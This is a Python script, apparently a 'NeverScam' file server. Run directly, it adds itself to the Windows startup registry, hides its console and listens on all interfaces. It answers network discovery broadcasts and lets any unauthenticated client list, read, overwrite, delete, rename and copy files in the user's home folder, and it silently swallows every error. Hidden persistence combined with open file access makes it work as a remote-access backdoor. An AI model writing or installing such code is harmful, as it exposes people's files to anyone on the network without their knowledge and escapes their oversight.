import socketserver
import os
import json
import threading
import time
import sys
import shutil
import socket

# UDP discovery port - must match client
DISCOVERY_PORT = 19876

def add_to_startup():
    """Add server to Windows startup registry."""
    if sys.platform != "win32":
        return
    
    try:
        import winreg
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
        script_path = os.path.abspath(sys.argv[0])
        python_path = sys.executable
        pythonw_path = python_path.replace("python.exe", "pythonw.exe")
        if not os.path.exists(pythonw_path):
            pythonw_path = python_path

        command = f'"{pythonw_path}" "{script_path}"'
        winreg.SetValueEx(key, "NeverScamFileServer", 0, winreg.REG_SZ, command)
        winreg.CloseKey(key)
    except Exception:
        pass

def run_hidden():
    """Run server completely hidden."""
    # Suppress console output on Windows
    if sys.platform == "win32":
        import ctypes
        ctypes.windll.kernel32.FreeConsole()
    
    host = '0.0.0.0'
    # Find available port and get IP
    port = find_best_port()
    ip = get_local_ip()
    
    # Write connection info to file (silent, no output)
    try:
        config_path = os.path.join(os.path.expanduser("~"), "NeverScam_Connection.txt")
        with open(config_path, 'w') as f:
            f.write(f"{ip}\n{port}\n")
    except Exception:
        pass
    
    # Run server
    server_thread = threading.Thread(target=run_server, args=(host, port), daemon=True)
    server_thread.start()
    
    # Keep alive silently
    while True:
        time.sleep(1)

def start_discovery_listener(server_port, server_ip):
    """Listen for UDP discovery broadcasts and respond with server info."""
    def listen():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind(('', DISCOVERY_PORT))
            sock.settimeout(1)
            while True:
                try:
                    data, addr = sock.recvfrom(1024)
                    if data == b"NEVERSCAM_DISCOVERY":
                        response = json.dumps({"ip": server_ip, "tcp_port": server_port}).encode()
                        sock.sendto(response, addr)
                except socket.timeout:
                    continue
                except Exception:
                    break
        except Exception:
            pass
    threading.Thread(target=listen, daemon=True).start()
    # Keep alive
    while True:
        time.sleep(1)

class FileServerHandler(socketserver.BaseRequestHandler):
    def handle(self):
        try:
            data = self.request.recv(1024).strip()
            if not data:
                return
            command = json.loads(data.decode('utf-8'))
            response = self.process_command(command)
            self.request.sendall(json.dumps(response).encode('utf-8'))
        except Exception as e:
            self.request.sendall(json.dumps({"error": str(e)}).encode('utf-8'))

    def process_command(self, command):
        cmd = command.get("cmd")
        path = command.get("path", "")
        path = os.path.abspath(path)
        if not path.startswith(os.path.expanduser("~")):
            return {"error": "Access denied"}

        if cmd == "LIST_DIR":
            try:
                items = os.listdir(path)
                return {"items": items}
            except Exception as e:
                return {"error": str(e)}
        elif cmd == "LIST_DIRS":
            try:
                items = [item for item in os.listdir(path) if os.path.isdir(os.path.join(path, item))]
                return {"items": items}
            except Exception as e:
                return {"error": str(e)}
        elif cmd == "READ_FILE":
            try:
                with open(path, 'r', encoding='utf-8') as f:
                    content = f.read()
                return {"content": content}
            except UnicodeDecodeError:
                return {"error": "Binary file"}
            except Exception as e:
                return {"error": str(e)}
        elif cmd == "WRITE_FILE":
            content = command.get("content", "")
            try:
                with open(path, 'w', encoding='utf-8') as f:
                    f.write(content)
                return {"status": "ok"}
            except Exception as e:
                return {"error": str(e)}
        elif cmd == "DELETE":
            try:
                if os.path.isfile(path):
                    os.remove(path)
                elif os.path.isdir(path):
                    os.rmdir(path)
                return {"status": "ok"}
            except Exception as e:
                return {"error": str(e)}
        elif cmd == "MKDIR":
            try:
                os.mkdir(path)
                return {"status": "ok"}
            except Exception as e:
                return {"error": str(e)}
        elif cmd == "RENAME":
            new_path = command.get("new_path")
            new_path = os.path.abspath(new_path)
            if not new_path.startswith(os.path.expanduser("~")):
                return {"error": "Access denied"}
            try:
                os.rename(path, new_path)
                return {"status": "ok"}
            except Exception as e:
                return {"error": str(e)}
        elif cmd == "COPY":
            dest = command.get("dest")
            dest = os.path.abspath(dest)
            if not dest.startswith(os.path.expanduser("~")):
                return {"error": "Access denied"}
            try:
                if os.path.isfile(path):
                    shutil.copy(path, dest)
                elif os.path.isdir(path):
                    shutil.copytree(path, dest)
                return {"status": "ok"}
            except Exception as e:
                return {"error": str(e)}
        elif cmd == "STAT":
            try:
                stat = os.stat(path)
                return {"size": stat.st_size, "mtime": stat.st_mtime}
            except Exception as e:
                return {"error": str(e)}
        else:
            return {"error": "Unknown command"}

def find_best_port(start_port=10000, max_attempts=100):
    """Find an available port starting from start_port."""
    for port in range(start_port, start_port + max_attempts):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.bind(('', port))
                return port
        except OSError:
            continue
    return 12345

def get_local_ip():
    """Get the best local IP address for the machine."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"

def run_server(host='0.0.0.0', port=None):
    if port is None:
        port = find_best_port()
    with socketserver.ThreadingTCPServer((host, port), FileServerHandler) as server:
        server.serve_forever()

if __name__ == "__main__":
    add_to_startup()
    run_hidden()

